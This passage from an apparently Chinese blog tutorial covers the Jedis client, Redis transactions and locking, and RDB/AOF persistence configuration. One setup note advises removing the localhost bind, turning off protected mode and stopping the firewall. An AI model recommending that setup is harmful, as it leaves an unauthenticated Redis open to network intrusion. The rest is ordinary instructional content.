class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>redis.clients<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jedis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>连接Redis注意事项：</p><p>redis.conf中注释掉<code>bind 127.0.0.1</code> ，然后设置<code>protected-mode no</code>，开放6379端口或者关闭防火墙<code>systemctl stop/disable firewalld.service</code></p></blockquote><p>测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">testJedis</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Jedis</span> <span class="variable">jedis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Jedis</span>(<span class="string">&quot;192.168.2.110&quot;</span>, <span class="number">6379</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Key操作</span></span><br><span class="line">    System.out.println(<span class="string">&quot;Key操作--------------&quot;</span>);</span><br><span class="line">    jedis.set(<span class="string">&quot;k1&quot;</span>, <span class="string">&quot;v1&quot;</span>);</span><br><span class="line">    jedis.set(<span class="string">&quot;k2&quot;</span>, <span class="string">&quot;v2&quot;</span>);</span><br><span class="line">    jedis.set(<span class="string">&quot;k3&quot;</span>, <span class="string">&quot;v3&quot;</span>);</span><br><span class="line">    Set&lt;String&gt; keys = jedis.keys(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">    System.out.println(keys.size());</span><br><span class="line">    <span class="keyword">for</span> (String key : keys) &#123;</span><br><span class="line">        System.out.println(key);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(jedis.exists(<span class="string">&quot;k1&quot;</span>));</span><br><span class="line">    System.out.println(jedis.ttl(<span class="string">&quot;k1&quot;</span>));</span><br><span class="line">    System.out.println(jedis.get(<span class="string">&quot;k1&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//String类型操作</span></span><br><span class="line">    System.out.println(<span class="string">&quot;String类型操作--------------&quot;</span>);</span><br><span class="line">    jedis.mset(<span class="string">&quot;str1&quot;</span>, <span class="string">&quot;v1&quot;</span>, <span class="string">&quot;str2&quot;</span>, <span class="string">&quot;v2&quot;</span>, <span class="string">&quot;str3&quot;</span>, <span class="string">&quot;v3&quot;</span>);</span><br><span class="line">    System.out.println(jedis.mget(<span class="string">&quot;str1&quot;</span>, <span class="string">&quot;str2&quot;</span>, <span class="string">&quot;str3&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//List类型操作</span></span><br><span class="line">    System.out.println(<span class="string">&quot;List类型操作--------------&quot;</span>);</span><br><span class="line">    jedis.lpush(<span class="string">&quot;mylist&quot;</span>, <span class="string">&quot;java&quot;</span>, <span class="string">&quot;php&quot;</span>, <span class="string">&quot;c++&quot;</span>, <span class="string">&quot;python&quot;</span>);</span><br><span class="line">    jedis.linsert(<span class="string">&quot;mylist&quot;</span>, ListPosition.BEFORE, <span class="string">&quot;c++&quot;</span>, <span class="string">&quot;c#&quot;</span>);</span><br><span class="line">    List&lt;String&gt; list = jedis.lrange(<span class="string">&quot;mylist&quot;</span>, <span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (String element : list) &#123;</span><br><span class="line">        System.out.println(element);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Set类型操作</span></span><br><span class="line">    System.out.println(<span class="string">&quot;Set类型操作--------------&quot;</span>);</span><br><span class="line">    jedis.sadd(<span class="string">&quot;orders&quot;</span>, <span class="string">&quot;order01&quot;</span>);</span><br><span class="line">    jedis.sadd(<span class="string">&quot;orders&quot;</span>, <span class="string">&quot;order02&quot;</span>);</span><br><span class="line">    jedis.sadd(<span class="string">&quot;orders&quot;</span>, <span class="string">&quot;order02&quot;</span>);</span><br><span class="line">    jedis.sadd(<span class="string">&quot;orders&quot;</span>, <span class="string">&quot;order03&quot;</span>);</span><br><span class="line">    jedis.sadd(<span class="string">&quot;orders&quot;</span>, <span class="string">&quot;order04&quot;</span>);</span><br><span class="line">    Set&lt;String&gt; smembers = jedis.smembers(<span class="string">&quot;orders&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (String order : smembers) &#123;</span><br><span class="line">        System.out.println(order);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;删除member&quot;</span>);</span><br><span class="line">    jedis.srem(<span class="string">&quot;orders&quot;</span>, <span class="string">&quot;order01&quot;</span>, <span class="string">&quot;order02&quot;</span>, <span class="string">&quot;order03&quot;</span>);</span><br><span class="line">    smembers = jedis.smembers(<span class="string">&quot;orders&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (String order : smembers) &#123;</span><br><span class="line">        System.out.println(order);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Hash类型操作</span></span><br><span class="line">    System.out.println(<span class="string">&quot;Hash类型操作--------------&quot;</span>);</span><br><span class="line">    jedis.hset(<span class="string">&quot;hash1&quot;</span>, <span class="string">&quot;userName&quot;</span>, <span class="string">&quot;lisi&quot;</span>);</span><br><span class="line">    System.out.println(jedis.hget(<span class="string">&quot;hash1&quot;</span>, <span class="string">&quot;userName&quot;</span>));</span><br><span class="line">    Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;telephone&quot;</span>, <span class="string">&quot;13810169999&quot;</span>);</span><br><span class="line">    map.put(<span class="string">&quot;address&quot;</span>, <span class="string">&quot;nanzx.top&quot;</span>);</span><br><span class="line">    map.put(<span class="string">&quot;email&quot;</span>, <span class="string">&quot;abc@163.com&quot;</span>);</span><br><span class="line">    jedis.hmset(<span class="string">&quot;hash2&quot;</span>, map);</span><br><span class="line">    List&lt;String&gt; result = jedis.hmget(<span class="string">&quot;hash2&quot;</span>, <span class="string">&quot;telephone&quot;</span>, <span class="string">&quot;email&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (String element : result) &#123;</span><br><span class="line">        System.out.println(element);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Zset类型操作</span></span><br><span class="line">    System.out.println(<span class="string">&quot;Zset类型操作--------------&quot;</span>);</span><br><span class="line">    jedis.zadd(<span class="string">&quot;zset01&quot;</span>, <span class="number">100d</span>, <span class="string">&quot;z3&quot;</span>);</span><br><span class="line">    jedis.zadd(<span class="string">&quot;zset01&quot;</span>, <span class="number">90d</span>, <span class="string">&quot;l4&quot;</span>);</span><br><span class="line">    jedis.zadd(<span class="string">&quot;zset01&quot;</span>, <span class="number">80d</span>, <span class="string">&quot;w5&quot;</span>);</span><br><span class="line">    jedis.zadd(<span class="string">&quot;zset01&quot;</span>, <span class="number">70d</span>, <span class="string">&quot;z6&quot;</span>);</span><br><span class="line">    List&lt;String&gt; zrange = jedis.zrange(<span class="string">&quot;zset01&quot;</span>, <span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (String e : zrange) &#123;</span><br><span class="line">        System.out.println(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    jedis.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="事务和锁机制"><a href="#事务和锁机制" class="headerlink" title="事务和锁机制"></a>事务和锁机制</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Redis事务的主要作用就是<strong>串联多个命令</strong>防止别的命令插队。</p><p><strong>Redis事务三特性：</strong></p><ul><li><p>单独的隔离操作 </p><ul><li>事务中的所有命令都会序列化、按顺序地执行。事务在执行的过程中，不会被其他客户端发送来的命令请求所打断。</li></ul></li><li><p>没有隔离级别的概念 </p><ul><li>队列中的命令没有提交之前都不会实际被执行，因为事务提交前任何指令都不会被实际执行</li></ul></li><li><p>不保证原子性 </p><ul><li>事务中如果有一条命令执行失败，其后的命令仍然会被执行，没有回滚</li></ul></li></ul><h2 id="Multi、Exec、discard命令"><a href="#Multi、Exec、discard命令" class="headerlink" title="Multi、Exec、discard命令"></a>Multi、Exec、discard命令</h2><p>从输入Multi命令开始，输入的命令都会依次进入命令队列中，但不会执行，直到输入Exec后，Redis会将之前的命令队列中的命令依次执行。</p><p>组队的过程中可以通过discard来放弃组队。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220212001323.png"></p><p>组队成功，提交成功：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; multi</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379(TX)&gt; set k1 v1</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; set k2 v2</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; exec</span><br><span class="line">1) OK</span><br><span class="line">2) OK</span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) &quot;k2&quot;</span><br><span class="line">2) &quot;k1&quot;</span><br></pre></td></tr></table></figure><p>组队阶段报错，提交失败：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; multi</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379(TX)&gt; set k1 v1</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; set e2</span><br><span class="line">(error) ERR wrong number of arguments for &#x27;set&#x27; command</span><br><span class="line">127.0.0.1:6379(TX)&gt; set k3 v3</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; exec</span><br><span class="line">(error) EXECABORT Transaction discarded because of previous errors.</span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br></pre></td></tr></table></figure><p>组队成功，提交有成功有失败情况：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; multi</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379(TX)&gt; set k1 v1</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; incr k1</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; set k2 v2</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; exec</span><br><span class="line">1) OK</span><br><span class="line">2) (error) ERR value is not an integer or out of range</span><br><span class="line">3) OK</span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) &quot;k2&quot;</span><br><span class="line">2) &quot;k1&quot;</span><br></pre></td></tr></table></figure><h2 id="事务的错误处理"><a href="#事务的错误处理" class="headerlink" title="事务的错误处理"></a>事务的错误处理</h2><p>组队中某个命令出现了报告错误，执行时整个的所有队列都会被取消。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220212113409.png"></p><p>如果执行阶段某个命令报出了错误，则只有报错的命令不会被执行，而其他的命令都会执行，不会回滚。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220212113425.png"></p><h2 id="事务冲突问题"><a href="#事务冲突问题" class="headerlink" title="事务冲突问题"></a>事务冲突问题</h2><p>一个请求想给金额减8000，一个请求想给金额减5000，一个请求想给金额减1000</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220212115249.png"></p><p><strong>悲观锁</strong>(Pessimistic Lock)：</p><p>顾名思义，就是很悲观，每次去拿数据的时候都认为别人会修改，所以每次在拿数据的时候都会上锁，这样别人想拿这个数据就会block直到它拿到锁。传统的关系型数据库里边就用到了很多这种锁机制，比如行锁，表锁等，读锁，写锁等，都是在做操作之前先上锁。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220212115540.png"></p><p><strong>乐观锁</strong>(Optimistic Lock)：</p><p>顾名思义，就是很乐观，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据，可以使用版本号等机制。乐观锁适用于多读的应用类型，这样可以提高吞吐量。<strong>Redis就是利用这种check-and-set机制实现事务的</strong>。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220212115548.png"></p><h2 id="Watch命令"><a href="#Watch命令" class="headerlink" title="Watch命令"></a>Watch命令</h2><p>在执行multi之前，先执行watch key1 [key2],可以监视一个(或多个) key ，如果在事务执行之前这个(或这些) key 被其他命令所改动，那么事务将被打断。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; get k</span><br><span class="line">&quot;0&quot;</span><br><span class="line">127.0.0.1:6379&gt; watch k</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; multi</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379(TX)&gt; incrby k 20</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; exec</span><br><span class="line">(nil)</span><br><span class="line">127.0.0.1:6379&gt; get k</span><br><span class="line">&quot;-20&quot;</span><br></pre></td></tr></table></figure><p>在执行exec前新建窗口执行以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; decrby k 20</span><br><span class="line">(integer) -20</span><br></pre></td></tr></table></figure><p>执行exec后返回nil说明事务被打断，incrby的命令没有被执行。</p><p>unwatch命令：取消 WATCH 命令对所有 key 的监视。</p><p>如果在执行 WATCH 命令之后，EXEC 命令或DISCARD 命令先被执行了的话，那么就不需要再执行UNWATCH 了。</p><hr><h1 id="Redis持久化"><a href="#Redis持久化" class="headerlink" title="Redis持久化"></a>Redis持久化</h1><h2 id="RDB（Redis-DataBase）"><a href="#RDB（Redis-DataBase）" class="headerlink" title="RDB（Redis DataBase）"></a>RDB（Redis DataBase）</h2><p>在指定的<strong>时间间隔</strong>内将内存中的数据集<strong>快照</strong>写入磁盘， 也就是行话讲的Snapshot快照，它恢复时是将快照文件直接读到内存里。</p><hr><h3 id="持久化流程"><a href="#持久化流程" class="headerlink" title="持久化流程"></a>持久化流程</h3><p>Redis会单独<strong>创建（fork）一个子进程</strong>来进行持久化，会先将数据写入到一个临时文件中，待持久化过程都结束了，再用这个<strong>临时文件替换上次持久化好的文件</strong>（默认名称是dump.rdb，与<code>redis-server</code>同个目录）。 整个过程中主进程是不进行任何IO操作的，这就确保了极高的性能。如果需要进行大规模数据的恢复，且对于数据恢复的完整性不是非常敏感，那RDB方式要比AOF方式更加的高效。RDB的缺点是<strong>最后一次持久化后的数据可能丢失</strong>。</p><p>RDB 触发机制分为使用指令（<code>SAVE</code> 和 <code>BGSAVE</code>）手动触发和 redis.conf 配置(<code>save 3600 1 </code>)自动触发。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220213222047.png"></p><p><strong>扩展：</strong></p><ul><li><p>SAVE 和 BGSAVE 两个命令都会调用 rdbSave 函数，但它们调用的方式各有不同：</p><ul><li><p>SAVE 直接调用 rdbSave ，阻塞 Redis 主进程，直到保存完成为止。在主进程阻塞期间，服务器不能处理客户端的任何请求。</p></li><li><p>BGSAVE 则 fork 出一个子进程，子进程负责调用 rdbSave ，并在保存完成之后向主进程发送信号，通知保存已完成。 Redis 服务器在BGSAVE 执行期间仍然可以继续处理客户端的请求。</p></li><li><p>可以通过lastsave 命令获取最后一次成功执行快照的时间</p></li></ul></li><li><p>执行flushall命令，也会产生dump.rdb文件，但里面是空的，无意义。</p></li><li><p>内存中的数据对象&lt;&#x3D;&#x3D;rdbLoad&#x3D;&#x3D;磁盘中的RDB文件，内存中的数据对象&#x3D;&#x3D;rdbSave&#x3D;&#x3D;&gt;磁盘中的RDB文件</p></li></ul><hr><h3 id="Fork进程"><a href="#Fork进程" class="headerlink" title="Fork进程"></a>Fork进程</h3><ul><li><p>Fork的作用是复制一个与当前进程一样的进程。新进程的所有数据（变量、环境变量、程序计数器等） 数值都和原进程一致，但是是一个全新的进程，并作为原进程的子进程</p></li><li><p>在Linux程序中，fork()会产生一个和父进程完全相同的子进程，但子进程在此后都会被exec系统调用，出于效率考虑，Linux中引入了“<strong>写时复制技术</strong>”</p></li><li><p>一般情况父进程和子进程会共用同一段物理内存，只有进程空间的各段的内容要发生变化时，才会将父进程的内容复制一份给子进程。</p></li></ul><hr><h3 id="相关配置"><a href="#相关配置" class="headerlink" title="相关配置"></a>相关配置</h3><p>RDB相关配置在redis.conf文件中的SNAPSHOTTING模块下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">############################### SNAPSHOTTING  ################################</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将数据库保存到磁盘.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">格式：save &lt;秒&gt; &lt;更新&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果指定的秒数和数据库写操作次数都满足了就将数据库保存。</span> </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用一个空字符串参数或者注释掉“save”这一行配置项可以完全禁用快照，如下例所示：</span></span><br><span class="line">save &quot;&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下面是保存操作的实例：</span>  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3600秒（1小时）内至少1个key值改变（则进行数据库保存--持久化）</span>  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">300秒（5分钟）内至少10个key值改变（则进行数据库保存--持久化）</span>  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">60秒（1分钟）内至少10000个key值改变（则进行数据库保存--持久化）</span>  </span><br><span class="line">save 3600 1</span><br><span class="line">save 300 100</span><br><span class="line">save 60 10000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当Redis无法写入磁盘的话，直接关掉Redis的写操作。推荐<span class="built_in">yes</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果后台存储（持久化）操作进程再次工作，Redis会自动允许更新操作。</span>  </span><br><span class="line">stop-writes-on-bgsave-error yes</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">对于存储到磁盘中的快照，可以设置是否进行压缩存储。如果是的话，redis会采用LZF算法进行压缩。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果你不想消耗CPU来进行压缩的话，可以设置为关闭此功能。推荐<span class="built_in">yes</span></span></span><br><span class="line">rdbcompression yes</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在存储快照后，redis使用CRC64算法来进行数据校验。推荐<span class="built_in">yes</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">但是在存储或者加载rbd文件时会增加大约10%的性能消耗，如果希望获取到最大的性能提升，可以关闭此功能</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">没有校验的RDB文件会有一个0校验位，来告诉加载代码跳过校验检查。</span>  </span><br><span class="line">rdbchecksum yes</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sanitize-dump-payload no</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导出数据库的文件名称</span>  </span><br><span class="line">dbfilename dump.rdb</span><br><span class="line"></span><br><span class="line">rdb-del-sync-files no</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">rdb文件的保存路径。默认为Redis启动时命令行所在的目录下</span></span><br><span class="line">dir ./</span><br></pre></td></tr></table></figure><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><ul><li><p>优点：</p><ul><li>适合大规模的数据恢复</li><li>对数据完整性和一致性要求不高更适合使用</li><li>节省磁盘空间</li><li>恢复速度快</li></ul></li><li><p>缺点：</p><ul><li><p>Fork的时候，内存中的数据被克隆了一份，大致2倍的膨胀性需要考虑</p></li><li><p>虽然Redis在fork时使用了<strong>写时拷贝技术</strong>，但是如果数据庞大时还是比较消耗性能，造成服务器在某某毫秒内停止处理客户端。</p></li><li><p>在备份周期内做一次备份，如果Redis意外down掉且备份未完成时，就会丢失最后一次快照后的所有修改。</p></li></ul></li></ul><h2 id="AOF（Append-Of-File）"><a href="#AOF（Append-Of-File）" class="headerlink" title="AOF（Append Of File）"></a>AOF（Append Of File）</h2><p>以日志的形式来记录每个写操作（<strong>增量保存</strong>），将Redis执行过的所有写指令记录下来(<strong>读操作不记录</strong>)， 只许<strong>追加文件但不可以改写文件</strong>，redis启动之初会读取该文件重新构建数据，换言之，redis 重启的话就根据日志文件的内容将写指令从前到后执行一次以完成数据的恢复工作。</p><h3 id="持久化流程-1"><a href="#持久化流程-1" class="headerlink" title="持久化流程"></a>持久化流程</h3><p>（1）客户端的请求<strong>写命令</strong>会被append追加到AOF缓冲区内；</p><p>（2）AOF缓冲区根据AOF持久化策略[always,everysec,no]将操作sync同步到磁盘的AOF文件中；</p><p>（3）AOF文件大小超过重写策略或手动重写时，会对AOF文件rewrite重写，压缩AOF文件容量；</p><p>（4）Redis服务重启时，会重新加载AOF文件中的写操作达到数据恢复的目的；</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220214225422.png"></p><h3 id="相关配置-1"><a href="#相关配置-1" class="headerlink" title="相关配置"></a>相关配置</h3><p>AOF相关配置在redis.conf文件中的APPEND ONLY MODE模块下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">############################# APPEND ONLY MODE ###############################</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">no表示关闭AOF，默认不开启</span></span><br><span class="line">appendonly no</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认追加命令的文件名称</span></span><br><span class="line">appendfilename &quot;appendonly.aof&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">always：始终同步，每次Redis的写入都会立刻记入日志；性能较差但数据完整性比较好。最安全。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">everysec：每秒同步，每秒记入日志一次，如果宕机，本秒的数据可能丢失。默认配置。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">no：redis不主动进行同步，把同步时机交给操作系统，在需要的时候刷新数据即可。最快。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">appendfsync always</span></span><br><span class="line">appendfsync everysec</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">appendfsync no</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重写配置参考下面</span></span><br><span class="line">no-appendfsync-on-rewrite no</span><br><span class="line"></span><br><span class="line">auto-aof-rewrite-percentage 100</span><br><span class="line">auto-aof-rewrite-min-size 64mb</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果aof load truncated设置为<span class="built_in">yes</span>，则会加载一个被截断的aof文件，Redis服务器开始发送日志，通知用户该事件。</span></span><br><span class="line">aof-load-truncated yes</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">当重写AOF文件时，Redis能够在AOF文件中使用RDB前导，以更快地重写和恢复。启用此选项后，重写的AOF文件由两个不#同的节组成：[RDB文件][AOF尾部]</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">加载时，Redis识别出AOF文件以“Redis”字符串开头，并加载带前缀的RDB文件，然后继续加载AOF尾部。</span></span><br><span class="line">aof-use-rdb-preamble yes</span><br></pre></td></tr></table></figure><h3 id="Rewrite重写压缩"><a href="#Rewrite重写压缩" class="headerlink" title="Rewrite重写压缩"></a>Rewrite重写压缩</h3><p><strong>简介</strong></p><p>AOF采用文件追加方式，文件会越来越大。为避免出现此种情况，新增了<strong>重写机制</strong>，当AOF文件大小超过所设定的阈值时，Redis就会启动AOF文件的内容压缩， 